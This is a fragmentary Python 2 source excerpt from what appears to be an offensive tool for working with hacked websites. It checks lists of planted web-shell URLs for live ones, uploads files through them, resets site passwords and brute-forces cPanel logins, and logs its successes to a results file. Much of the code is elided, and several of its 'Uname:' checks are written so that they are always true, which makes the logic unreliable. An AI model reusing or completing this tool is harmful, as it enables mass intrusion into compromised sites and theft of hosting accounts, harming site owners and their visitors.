...
def uploadfile(shell, fileSrc):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        checklive = requests.get(shell,timeout=7).content
        if 'Uname:' or 'Uname :' in checklive:
            print fy+'(*) Shell Working Uploading ...'+fw
            upload(shell, fileSrc)
            print fg+'[+] Done -> ' + path+fw
            open("Result/Uploaded.txt", "a").write(path+'\n')
...
def checkshell(shell):
    try:
        ...
        if ("Uname:" or "Uname :") in checkshell:
...
def resetPassword(shell):
    try:
        ...
        if 'Uname:' or 'Uname :' in checkiflive:
...
def cprbuteforce(shell):
    try:
        ...
        if ('/home/' or '/home2/' or '/public_html/' in checkifshellhomepath) and ('Uname:' or 'Uname :' in checkifshellhomepath):
...
def main():
    Banner = """
_______              _____  ___.   ___.                   .__       ____________________
\   _  \  ___  ___  /  _  \ \_ |__ \_ |__  _____  _______ |  |__   /   _____/\_   _____/
/  /_\  \ \  \/  / /  /_\  \ | __ \ | __ \ \__  \ \_  __ \|  |  \  \_____  \  |    __)  
\  \_/   \ >    < /    |    \| \_\ \| \_\ \ / __ \_|  | \/|   Y  \ /        \ |     \   
